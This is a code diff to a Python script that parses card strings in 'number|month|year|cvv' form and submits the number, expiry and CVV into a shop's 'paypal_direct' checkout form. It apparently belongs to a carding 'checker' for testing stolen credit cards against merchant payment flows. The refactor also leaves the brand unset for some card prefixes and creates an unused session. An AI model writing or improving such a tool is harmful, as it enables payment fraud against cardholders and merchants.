@@ -37,27 +37,16 @@ class Autocomplet:
 
 @dataclass
 class pafiw:
-    def __init__(self, tarjeta):
+    def __init__(self, card):
 
-            partes = tarjeta.split("|")
-        
-            self.tarjeta = tarjeta
-            if len(partes) == 4:
-                self.cc = partes[0]
-                self.mes = partes[1]
-                self.ano = partes[2]
-                self.cvv = partes[3]
-    def detectar_tipo_tarjeta(self):
-        if self.cc.startswith("4"):
-            return "Visa"
-        elif self.cc.startswith("5"):
-            return "MasterCard"
-        elif self.cc.startswith("3"):
-            return "American Express"
-        elif self.cc.startswith("6"):
-            return "Discover"
-        else:
-            return "Desconocido"
+
+        self.card = card
+        self.ccs = card.split('|')
+        if self.ccs[0].startswith("4"): self.brand = "VI"
+        if self.ccs[0].startswith("3"): self.brand = "AE"
+        elif self.ccs[0].startswith("5"): self.brand = "MC"
+        session = requests.Session()
+
     def main(self):
         try:
             session = Session()
@@ -288,11 +277,11 @@ class pafiw:
 
             data = {
                 'payment[method]': 'paypal_direct',
-                'payment[cc_type]': self.detectar_tipo_tarjeta(),
-                'payment[cc_number]': self.cc,
-                'payment[cc_exp_month]': self.mes,
-                'payment[cc_exp_year]': self.ano,
-                'payment[cc_cid]': self.cvv,
+                'payment[cc_type]': self.brand,
+                'payment[cc_number]': self.ccs[0],
+                'payment[cc_exp_month]': self.ccs[1],
+                'payment[cc_exp_year]': self.ccs[2],
+                'payment[cc_cid]': self.ccs[3],
                 'form_key': fromkey2,
             }
 
@@ -320,11 +309,11 @@ class pafiw:
 
             data = {
                 'payment[method]': 'paypal_direct',
-                'payment[cc_type]': self.detectar_tipo_tarjeta(),
-                'payment[cc_number]': self.cc,
-                'payment[cc_exp_month]': self.mes,
-                'payment[cc_exp_year]': self.ano,
-                'payment[cc_cid]': self.cvv,
+                'payment[cc_type]': self.brand,
+                'payment[cc_number]': self.ccs[0],
+                'payment[cc_exp_month]': self.ccs[1],
+                'payment[cc_exp_year]': self.ccs[2],
+                'payment[cc_cid]': self.ccs[3],
                 'form_key': fromkey2,
                 'cdr_ordercomment': '',
             }
